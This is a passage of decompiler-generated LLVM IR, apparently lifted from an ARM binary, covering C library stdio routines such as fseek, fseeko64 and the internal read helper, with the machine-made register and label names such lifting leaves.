  %v1_15290 = inttoptr i32 %v1_1528c to i32*
  %v2_15290 = load i32, i32* %v1_15290, align 4
  store i32 %v2_15290, i32* %r8.global-to-local, align 4
  %v3_15290 = add i32 %v0_1528c, 12
  %v4_15290 = inttoptr i32 %v3_15290 to i32*
  %v5_15290 = load i32, i32* %v4_15290, align 4
  store i32 %v5_15290, i32* %sb.global-to-local, align 4
  %v1_15294 = inttoptr i32 %v0_15294 to i32*
  store i32 %v2_15288, i32* %v1_15294, align 4
  %v3_15294 = add i32 %v0_15294, 4
  %v4_15294 = inttoptr i32 %v3_15294 to i32*
  %v5_15294 = load i32, i32* @r4, align 4
  store i32 %v5_15294, i32* %v4_15294, align 4
  %v0_15298 = load i32, i32* %r8.global-to-local, align 4
  %v1_15298 = load i32, i32* @r5, align 4
  %v2_15298 = add i32 %v1_15298, 8
  %v3_15298 = inttoptr i32 %v2_15298 to i32*
  store i32 %v0_15298, i32* %v3_15298, align 4
  %v0_1529c = load i32, i32* %sb.global-to-local, align 4
  %v1_1529c = load i32, i32* @r5, align 4
  %v2_1529c = add i32 %v1_1529c, 12
  %v3_1529c = inttoptr i32 %v2_1529c to i32*
  store i32 %v0_1529c, i32* %v3_1529c, align 4
  %v0_152a0 = load i32, i32* @ip, align 4
  %v1_152a0 = trunc i32 %v0_152a0 to i16
  %v2_152a0 = load i32, i32* @r5, align 4
  %v3_152a0 = add i32 %v2_152a0, 16
  %v4_152a0 = inttoptr i32 %v3_152a0 to i16*
  store i16 %v1_152a0, i16* %v4_152a0, align 2
  %v0_152a4 = load i32, i32* @r7, align 4
  %v1_152a4 = add i32 %v0_152a4, 18
  %v2_152a4 = inttoptr i32 %v1_152a4 to i8*
  %v3_152a4 = load i8, i8* %v2_152a4, align 1
  %v4_152a4 = zext i8 %v3_152a4 to i32
  store i32 %v4_152a4, i32* @r3, align 4
  %v2_152a8 = load i32, i32* @r5, align 4
  %v3_152a8 = add i32 %v2_152a8, 18
  %v4_152a8 = inttoptr i32 %v3_152a8 to i8*
  store i8 %v3_152a4, i8* %v4_152a8, align 1
  %v0_152ac = call i32 @memcpy()
  %v0_152b0 = load i32, i32* @r7, align 4
  %v1_152b0 = add i32 %v0_152b0, 16
  %v2_152b0 = inttoptr i32 %v1_152b0 to i16*
  %v3_152b0 = load i16, i16* %v2_152b0, align 2
  %v4_152b0 = zext i16 %v3_152b0 to i32
  %v0_152b4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_152b4, i32* @r5, align 4
  %v2_152b8 = add i32 %v4_152b0, %v0_152b0
  store i32 %v2_152b8, i32* @r7, align 4
  br label %dec_label_pc_152bc

dec_label_pc_152bc:                               ; preds = %dec_label_pc_1520c, %dec_label_pc_15288
  %v0_15294 = phi i32 [ %tmp, %dec_label_pc_1520c ], [ %v0_152b4, %dec_label_pc_15288 ]
  %v0_1528c = phi i32 [ %v1_151c0, %dec_label_pc_1520c ], [ %v2_152b8, %dec_label_pc_15288 ]
  %v3_152c0 = icmp ult i32 %v0_1528c, %v2_1520c
  %v1_152c4 = add i32 %v0_15294, 19
  store i32 %v1_152c4, i32* @r0, align 4
  %v1_152c8 = add i32 %v0_1528c, 19
  store i32 %v1_152c8, i32* @r1, align 4
  br i1 %v3_152c0, label %dec_label_pc_1522c, label %dec_label_pc_152d0.loopexit

dec_label_pc_152d0.loopexit:                      ; preds = %dec_label_pc_152bc
  %v0_152d0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_152d0

dec_label_pc_152d0:                               ; preds = %dec_label_pc_152d0.loopexit, %dec_label_pc_1524c
  %v1_152d0 = phi i32 [ %v0_15294, %dec_label_pc_152d0.loopexit ], [ %v0_15264, %dec_label_pc_1524c ]
  %v0_152d0 = phi i32 [ %v0_152d0.pre, %dec_label_pc_152d0.loopexit ], [ %v1_15264, %dec_label_pc_1524c ]
  %v2_152d0 = sub i32 %v1_152d0, %v0_152d0
  store i32 %v2_152d0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_152d4

dec_label_pc_152d4:                               ; preds = %dec_label_pc_15204, %dec_label_pc_1526c, %dec_label_pc_151e8, %dec_label_pc_152d0
  %v0_152d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_151a8, i32* @r5, align 4
  store i32 %v12_151a8, i32* @r7, align 4
  ret i32 %v0_152d4

; uselistorder directives
  uselistorder i32 %v0_1528c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_15294, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_151c0, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 1, 2, 0, 3 }
  uselistorder i32 18, { 2, 3, 0, 1 }
  uselistorder i32* @sp, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_152d4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_152bc, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_152f8 = load i32, i32* @r1, align 4
  store i32 %v0_152f8, i32* @r2, align 4
  %v0_15300 = call i32 @__GI_fseeko64()
  ret i32 %v0_15300
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %v3_15310 = load i32, i32* @r4, align 4
  %v6_15310 = load i32, i32* @r5, align 4
  %v12_15310 = load i32, i32* @r7, align 4
  %v2_15314 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %tmp18, i32* %sl.global-to-local, align 4
  %v2_1531c = icmp ugt i32 %tmp18, 1
  store i1 %v2_1531c, i1* %cpsr_c.global-to-local, align 1
  %v7_1531c = icmp eq i32 %tmp18, 2
  %v0_15320 = load i32, i32* @r0, align 4
  store i32 %v0_15320, i32* @r7, align 4
  %v2_15324 = xor i1 %v2_1531c, true
  %v3_15324 = or i1 %v7_1531c, %v2_15324
  br i1 %v3_15324, label %dec_label_pc_15344, label %dec_label_pc_15328

dec_label_pc_15328:                               ; preds = %entry
  store i32 60728, i32* %r2.global-to-local, align 4
  %v0_1532c = call i32 @__aeabi_read_tp()
  %v3_15330 = load i16, i16* @global_var_24070.401, align 2
  %v4_15330 = sext i16 %v3_15330 to i32
  store i32 %v4_15330, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v3_1533c = add i32 %v4_15330, %v0_1532c
  %v4_1533c = inttoptr i32 %v3_1533c to i32*
  store i32 22, i32* %v4_1533c, align 4
  br label %dec_label_pc_154bc

dec_label_pc_15344:                               ; preds = %entry
  %v1_15344 = add i32 %v0_15320, 52
  %v2_15344 = inttoptr i32 %v1_15344 to i32*
  %v3_15344 = load i32, i32* %v2_15344, align 4
  store i32 %v3_15344, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15348 = icmp eq i32 %v3_15344, 0
  %v2_1534c = load i32, i32* @r2, align 4
  store i32 %v2_1534c, i32* %stack_var_-40, align 4
  br i1 %v2_15348, label %dec_label_pc_15354, label %dec_label_pc_153b8

dec_label_pc_15354:                               ; preds = %dec_label_pc_15344
  %v0_15354 = call i32 @__aeabi_read_tp()
  %v0_15358 = load i32, i32* @r7, align 4
  %v1_15358 = add i32 %v0_15358, 64
  %v2_15358 = inttoptr i32 %v1_15358 to i32*
  %v3_15358 = load i32, i32* %v2_15358, align 4
  store i32 %v3_15358, i32* %r3.global-to-local, align 4
  %v1_1535c = add i32 %v0_15354, -1168
  store i32 %v1_1535c, i32* %r6.global-to-local, align 4
  %v3_15360 = icmp uge i32 %v3_15358, %v1_1535c
  store i1 %v3_15360, i1* %cpsr_c.global-to-local, align 1
  %v9_15360 = icmp eq i32 %v3_15358, %v1_1535c
  br i1 %v9_15360, label %dec_label_pc_153ac, label %dec_label_pc_15368

dec_label_pc_15368:                               ; preds = %dec_label_pc_15354
  %v1_15368 = add i32 %v0_15358, 56
  store i32 %v1_15368, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_15368, i32* %r2.global-to-local, align 4
  %v0_15374 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15374, i32* @r4, align 4
  %v1_1537837 = inttoptr i32 %v1_15368 to i32*
  %v2_1537838 = load i32, i32* %v1_1537837, align 4
  store i32 %v2_1537838, i32* %r3.global-to-local, align 4
  %v3_1537c40 = icmp uge i32 %v2_1537838, %v0_15374
  store i1 %v3_1537c40, i1* %cpsr_c.global-to-local, align 1
  %v9_1537c46 = icmp eq i32 %v2_1537838, %v0_15374
  br i1 %v9_1537c46, label %dec_label_pc_15384, label %dec_label_pc_1539c

dec_label_pc_15384:                               ; preds = %dec_label_pc_15368, %dec_label_pc_15384.dec_label_pc_15378_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15394 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15394, label %dec_label_pc_15398, label %dec_label_pc_15384.dec_label_pc_15378_crit_edge

dec_label_pc_15384.dec_label_pc_15378_crit_edge:  ; preds = %dec_label_pc_15384
  %v0_15378.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1537c.pre = load i32, i32* @r4, align 4
  %v1_15378 = inttoptr i32 %v0_15378.pre to i32*
  %v2_15378 = load i32, i32* %v1_15378, align 4
  store i32 %v2_15378, i32* %r3.global-to-local, align 4
  %v3_1537c = icmp uge i32 %v2_15378, %v1_1537c.pre
  store i1 %v3_1537c, i1* %cpsr_c.global-to-local, align 1
  %v9_1537c = icmp eq i32 %v2_15378, %v1_1537c.pre
  br i1 %v9_1537c, label %dec_label_pc_15384, label %dec_label_pc_1539c

dec_label_pc_15398:                               ; preds = %dec_label_pc_15384
  %v0_15398 = load i32, i32* @r4, align 4
  store i32 %v0_15398, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1539c

dec_label_pc_1539c:                               ; preds = %dec_label_pc_15368, %dec_label_pc_15384.dec_label_pc_15378_crit_edge, %dec_label_pc_15398
  %v0_1539c = phi i32 [ %v0_15398, %dec_label_pc_15398 ], [ %v2_1537838, %dec_label_pc_15368 ], [ %v2_15378, %dec_label_pc_15384.dec_label_pc_15378_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1539c = icmp eq i32 %v0_1539c, 0
  br i1 %v2_1539c, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_1539c
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1539c, %bb
  store i32 86952, i32* @lr, align 4
  %v1_153a4 = xor i1 %v2_1539c, true
  call void @__pseudo_cond_branch(i1 %v1_153a4, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_153a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_153a8 = load i32, i32* @r7, align 4
  %v2_153a8 = add i32 %v1_153a8, 64
  %v3_153a8 = inttoptr i32 %v2_153a8 to i32*
  store i32 %v0_153a8, i32* %v3_153a8, align 4
  %v0_153ac.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_153ac

dec_label_pc_153ac:                               ; preds = %dec_label_pc_15354, %bb21
  %v0_153ac = phi i32 [ %v0_15358, %dec_label_pc_15354 ], [ %v0_153ac.pre, %bb21 ]
  %v1_153ac = add i32 %v0_153ac, 60
  %v2_153ac = inttoptr i32 %v1_153ac to i32*
  %v3_153ac = load i32, i32* %v2_153ac, align 4
  %v1_153b0 = add i32 %v3_153ac, 1
  store i32 %v1_153b0, i32* %r3.global-to-local, align 4
  store i32 %v1_153b0, i32* %v2_153ac, align 4
  %v0_153b8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %dec_label_pc_15344, %dec_label_pc_153ac
  %v0_153c4 = phi i32 [ %v0_15320, %dec_label_pc_15344 ], [ %v0_153b8.pre, %dec_label_pc_153ac ]
  %v1_153b8 = inttoptr i32 %v0_153c4 to i16*
  %v2_153b8 = load i16, i16* %v1_153b8, align 2
  %v3_153b8 = zext i16 %v2_153b8 to i32
  store i32 %v3_153b8, i32* %r3.global-to-local, align 4
  %v1_153bc = and i32 %v3_153b8, 64
  %v2_153bc = icmp eq i32 %v1_153bc, 0
  br i1 %v2_153bc, label %dec_label_pc_153d4, label %dec_label_pc_153c4

dec_label_pc_153c4:                               ; preds = %dec_label_pc_153b8
  store i32 %v0_153c4, i32* @r0, align 4
  %v0_153c8 = call i32 @__stdio_wcommit()
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153cc = icmp eq i32 %v0_153c8, 0
  br i1 %v2_153cc, label %dec_label_pc_153d4, label %dec_label_pc_1543c

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153c4, %dec_label_pc_153b8
  %v0_153d4 = load i32, i32* %sl.global-to-local, align 4
  %v2_153d4 = icmp ne i32 %v0_153d4, 0
  store i1 %v2_153d4, i1* %cpsr_c.global-to-local, align 1
  %v7_153d4 = icmp eq i32 %v0_153d4, 1
  br i1 %v7_153d4, label %dec_label_pc_153dc, label %dec_label_pc_153f0

dec_label_pc_153dc:                               ; preds = %dec_label_pc_153d4
  %v0_153dc = load i32, i32* @r7, align 4
  store i32 %v2_15314, i32* %r1.global-to-local, align 4
  %v2_153e4 = inttoptr i32 %v0_153dc to i16*
  %v3_153e4 = call i32 @__stdio_adjust_position(i16* %v2_153e4, i32 %v2_15314)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_153e8 = icmp slt i32 %v3_153e4, 0
  br i1 %v1_153e8, label %dec_label_pc_1543c, label %dec_label_pc_153dc.dec_label_pc_153f0_crit_edge

dec_label_pc_153dc.dec_label_pc_153f0_crit_edge:  ; preds = %dec_label_pc_153dc
  %v0_153f0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_153f0

dec_label_pc_153f0:                               ; preds = %dec_label_pc_153dc.dec_label_pc_153f0_crit_edge, %dec_label_pc_153d4
  %v0_153f0 = phi i32 [ %v0_153f0.pre, %dec_label_pc_153dc.dec_label_pc_153f0_crit_edge ], [ %v0_153d4, %dec_label_pc_153d4 ]
  store i32 %v0_153f0, i32* %r2.global-to-local, align 4
  %v0_153f4 = load i32, i32* @r7, align 4
  store i32 %v2_15314, i32* %r1.global-to-local, align 4
  %v4_153fc = call i32 @__stdio_seek(i32 %v0_153f4, i32* nonnull %stack_var_-40, i32 %v0_153f0)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15400 = icmp slt i32 %v4_153fc, 0
  br i1 %v1_15400, label %dec_label_pc_1543c, label %dec_label_pc_15408

dec_label_pc_15408:                               ; preds = %dec_label_pc_153f0
  %v0_15408 = load i32, i32* @r7, align 4
  %v1_15408 = inttoptr i32 %v0_15408 to i16*
  %v2_15408 = load i16, i16* %v1_15408, align 2
  %v3_15408 = zext i16 %v2_15408 to i32
  store i32 %v3_15408, i32* %r3.global-to-local, align 4
  %v1_1540c = add i32 %v0_15408, 8
  %v2_1540c = inttoptr i32 %v1_1540c to i32*
  %v3_1540c = load i32, i32* %v2_1540c, align 4
  store i32 %v3_1540c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_15414 = and i32 %v3_15408, 65464
  store i32 %v1_15414, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_1541c = trunc i32 %v1_15414 to i16
  store i16 %v1_1541c, i16* %v1_15408, align 2
  %v0_15420 = load i32, i32* %r2.global-to-local, align 4
  %v1_15420 = load i32, i32* @r7, align 4
  %v2_15420 = add i32 %v1_15420, 28
  %v3_15420 = inttoptr i32 %v2_15420 to i32*
  store i32 %v0_15420, i32* %v3_15420, align 4
  %v0_15424 = load i32, i32* %r2.global-to-local, align 4
  %v1_15424 = load i32, i32* @r7, align 4
  %v2_15424 = add i32 %v1_15424, 16
  %v3_15424 = inttoptr i32 %v2_15424 to i32*
  store i32 %v0_15424, i32* %v3_15424, align 4
  %v0_15428 = load i32, i32* %r2.global-to-local, align 4
  %v1_15428 = load i32, i32* @r7, align 4
  %v2_15428 = add i32 %v1_15428, 20
  %v3_15428 = inttoptr i32 %v2_15428 to i32*
  store i32 %v0_15428, i32* %v3_15428, align 4
  %v0_1542c = load i32, i32* %r2.global-to-local, align 4
  %v1_1542c = load i32, i32* @r7, align 4
  %v2_1542c = add i32 %v1_1542c, 24
  %v3_1542c = inttoptr i32 %v2_1542c to i32*
  store i32 %v0_1542c, i32* %v3_1542c, align 4
  %v0_15430 = load i32, i32* %r1.global-to-local, align 4
  %v1_15430 = load i32, i32* @r7, align 4
  %v2_15430 = add i32 %v1_15430, 44
  %v3_15430 = inttoptr i32 %v2_15430 to i32*
  store i32 %v0_15430, i32* %v3_15430, align 4
  %v0_15434 = load i32, i32* %r1.global-to-local, align 4
  %v1_15434 = trunc i32 %v0_15434 to i8
  %v2_15434 = load i32, i32* @r7, align 4
  %v3_15434 = add i32 %v2_15434, 2
  %v4_15434 = inttoptr i32 %v3_15434 to i8*
  store i8 %v1_15434, i8* %v4_15434, align 1
  br label %dec_label_pc_15440

dec_label_pc_1543c:                               ; preds = %dec_label_pc_153c4, %dec_label_pc_153f0, %dec_label_pc_153dc
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15440

dec_label_pc_15440:                               ; preds = %dec_label_pc_15408, %dec_label_pc_1543c
  %v0_15440 = load i32, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15440 = icmp eq i32 %v0_15440, 0
  br i1 %v2_15440, label %dec_label_pc_15448, label %dec_label_pc_154bc

dec_label_pc_15448:                               ; preds = %dec_label_pc_15440
  %v0_15448 = load i32, i32* @r7, align 4
  %v1_15448 = add i32 %v0_15448, 60
  %v2_15448 = inttoptr i32 %v1_15448 to i32*
  %v3_15448 = load i32, i32* %v2_15448, align 4
  %v1_1544c = add i32 %v3_15448, -1
  store i32 %v1_1544c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15450 = icmp eq i32 %v1_1544c, 0
  store i32 %v1_1544c, i32* %v2_15448, align 4
  br i1 %v2_15450, label %dec_label_pc_1545c, label %dec_label_pc_154bc

dec_label_pc_1545c:                               ; preds = %dec_label_pc_15448
  %v0_1545c = load i32, i32* %r3.global-to-local, align 4
  %v1_1545c = load i32, i32* @r7, align 4
  %v2_1545c = add i32 %v1_1545c, 64
  %v3_1545c = inttoptr i32 %v2_1545c to i32*
  store i32 %v0_1545c, i32* %v3_1545c, align 4
  %v0_15460 = load i32, i32* @r7, align 4
  %v1_15460 = add i32 %v0_15460, 56
  store i32 %v1_15460, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15464

dec_label_pc_15464:                               ; preds = %dec_label_pc_15494.dec_label_pc_15464_crit_edge, %dec_label_pc_1545c
  %v0_1546c = phi i32 [ %v0_1546c.pre, %dec_label_pc_15494.dec_label_pc_15464_crit_edge ], [ %v1_15460, %dec_label_pc_1545c ]
  %v0_15464 = phi i32 [ %v0_15464.pre, %dec_label_pc_15494.dec_label_pc_15464_crit_edge ], [ %v0_15460, %dec_label_pc_1545c ]
  %v1_15464 = add i32 %v0_15464, 56
  %v2_15464 = inttoptr i32 %v1_15464 to i32*
  %v3_15464 = load i32, i32* %v2_15464, align 4
  store i32 %v3_15464, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1546c, i32* %r2.global-to-local, align 4
  %v1_1547025 = inttoptr i32 %v0_1546c to i32*
  %v2_1547026 = load i32, i32* %v1_1547025, align 4
  store i32 %v2_1547026, i32* %r3.global-to-local, align 4
  %v3_1547428 = icmp uge i32 %v2_1547026, %v3_15464
  store i1 %v3_1547428, i1* %cpsr_c.global-to-local, align 1
  %v9_1547434 = icmp eq i32 %v2_1547026, %v3_15464
  br i1 %v9_1547434, label %dec_label_pc_1547c, label %dec_label_pc_15494

dec_label_pc_1547c:                               ; preds = %dec_label_pc_15464, %dec_label_pc_1547c.dec_label_pc_15470_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1548c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1548c, label %dec_label_pc_15490, label %dec_label_pc_1547c.dec_label_pc_15470_crit_edge

dec_label_pc_1547c.dec_label_pc_15470_crit_edge:  ; preds = %dec_label_pc_1547c
  %v0_15470.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15474.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15470 = inttoptr i32 %v0_15470.pre to i32*
  %v2_15470 = load i32, i32* %v1_15470, align 4
  store i32 %v2_15470, i32* %r3.global-to-local, align 4
  %v3_15474 = icmp uge i32 %v2_15470, %v1_15474.pre
  store i1 %v3_15474, i1* %cpsr_c.global-to-local, align 1
  %v9_15474 = icmp eq i32 %v2_15470, %v1_15474.pre
  br i1 %v9_15474, label %dec_label_pc_1547c, label %dec_label_pc_15494

dec_label_pc_15490:                               ; preds = %dec_label_pc_1547c
  %v0_15490 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15490, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15494

dec_label_pc_15494:                               ; preds = %dec_label_pc_15464, %dec_label_pc_1547c.dec_label_pc_15470_crit_edge, %dec_label_pc_15490
  %v0_1549c = phi i32 [ %v0_15490, %dec_label_pc_15490 ], [ %v2_1547026, %dec_label_pc_15464 ], [ %v2_15470, %dec_label_pc_1547c.dec_label_pc_15470_crit_edge ]
  %v1_15494 = phi i32 [ %v0_15490, %dec_label_pc_15490 ], [ %v3_15464, %dec_label_pc_15464 ], [ %v1_15474.pre, %dec_label_pc_1547c.dec_label_pc_15470_crit_edge ]
  %v3_15494 = icmp uge i32 %v0_1549c, %v1_15494
  store i1 %v3_15494, i1* %cpsr_c.global-to-local, align 1
  %v9_15494 = icmp eq i32 %v0_1549c, %v1_15494
  br i1 %v9_15494, label %dec_label_pc_1549c, label %dec_label_pc_15494.dec_label_pc_15464_crit_edge

dec_label_pc_15494.dec_label_pc_15464_crit_edge:  ; preds = %dec_label_pc_15494
  %v0_15464.pre = load i32, i32* @r7, align 4
  %v0_1546c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15464

dec_label_pc_1549c:                               ; preds = %dec_label_pc_15494
  %v2_1549c = icmp ne i32 %v1_15494, 0
  store i1 %v2_1549c, i1* %cpsr_c.global-to-local, align 1
  %v7_154a0 = icmp slt i32 %v1_15494, 2
  br i1 %v7_154a0, label %dec_label_pc_154bc, label %dec_label_pc_154a4

dec_label_pc_154a4:                               ; preds = %dec_label_pc_1549c
  %v0_154a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_154a8 = add i32 %v0_154a8, 129
  store i32 %v1_154a8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_154bc

dec_label_pc_154bc:                               ; preds = %dec_label_pc_15448, %dec_label_pc_15440, %dec_label_pc_154a4, %dec_label_pc_1549c, %dec_label_pc_15328
  %v0_154bc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v3_15310, i32* @r4, align 4
  store i32 %v6_15310, i32* @r5, align 4
  store i32 %v12_15310, i32* @r7, align 4
  ret i32 %v0_154bc

; uselistorder directives
  uselistorder i32 %v0_15490, { 1, 0, 2 }
  uselistorder i32 %v1_15474.pre, { 0, 2, 1 }
  uselistorder i32 %v0_153f0, { 1, 0 }
  uselistorder i32 %v0_153d4, { 0, 2, 1 }
  uselistorder i32 %v1_1537c.pre, { 1, 0 }
  uselistorder i32 %v2_15314, { 0, 2, 1 }
  uselistorder i32 %tmp18, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1, 15, 16 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12, 16, 17, 13, 14, 15 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 26, 22, 23, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 -61441, { 37, 38, 13, 14, 0, 39, 40, 41, 42, 43, 44, 45, 1, 2, 8, 9, 10, 11, 12, 25, 26, 27, 28, 29, 30, 21, 22, 23, 24, 4, 5, 31, 32, 6, 7, 3, 33, 34, 35, 36, 15, 16, 17, 18, 19, 20 }
  uselistorder label %dec_label_pc_154bc, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_15494, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1547c, { 1, 0 }
  uselistorder label %dec_label_pc_15440, { 1, 0 }
  uselistorder label %dec_label_pc_1543c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_153b8, { 1, 0 }
  uselistorder label %dec_label_pc_153ac, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_1539c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15384, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_154d0 = load i32, i32* @r4, align 4
  store i32 %v3_154d0, i32* %stack_var_-12, align 4
  %v0_154d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_154d4 = inttoptr i32 %v0_154d4 to i16*
  %v2_154d4 = load i16, i16* %v1_154d4, align 2
  %v3_154d4 = zext i16 %v2_154d4 to i32
  store i32 %v3_154d4, i32* @r3, align 4
  %v1_154d8 = and i32 %v3_154d4, 4
  store i32 %v1_154d8, i32* @r5, align 4
  %v2_154d8 = icmp eq i32 %v1_154d8, 0
  store i32 %v0_154d4, i32* @r4, align 4
  br i1 %v2_154d8, label %dec_label_pc_154ec, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_154ec:                               ; preds = %entry
  %v1_154ec = icmp slt i32 %arg2, 0
  br i1 %v1_154ec, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_154ec
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_154ec, %bb18
  %v1_154f4 = add i32 %v0_154d4, 4
  %v2_154f4 = inttoptr i32 %v1_154f4 to i32*
  %v3_154f4 = load i32, i32* %v2_154f4, align 4
  store i32 %v3_154f4, i32* %r0.global-to-local, align 4
  %v1_154f8 = call i32 @__libc_read(i32 %v3_154f4)
  store i32 %v1_154f8, i32* %r0.global-to-local, align 4
  %v5_15500 = icmp sgt i32 %v1_154f8, 0
  br i1 %v5_15500, label %.thread7, label %dec_label_pc_15504

dec_label_pc_15504:                               ; preds = %bb19
  %v2_154fc = icmp eq i32 %v1_154f8, 0
  %v0_15504 = load i32, i32* @r4, align 4
  %v1_15504 = inttoptr i32 %v0_15504 to i16*
  %v2_15504 = load i16, i16* %v1_15504, align 2
  br i1 %v2_154fc, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15504
  %v2_15508 = or i16 %v2_15504, 4
  store i16 %v2_15508, i16* %v1_15504, align 2
  %v1_15524.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_15504
  %v2_1550c = or i16 %v2_15504, 8
  store i16 %v2_1550c, i16* %v1_15504, align 2
  %v1_15518 = load i32, i32* @r5, align 4
  store i32 %v1_15518, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_15524 = phi i32 [ %v1_15524.pre, %bb20 ], [ 0, %bb ], [ %v1_154f8, %bb19 ], [ %v1_15518, %bb21 ]
  %v2_15520 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15520, i32* @r4, align 4
  ret i32 %v1_15524

; uselistorder directives
  uselistorder i16 %v2_15504, { 1, 0 }
  uselistorder i32 %v1_154f8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 2147483647, { 6, 1, 7, 2, 5, 3, 4, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
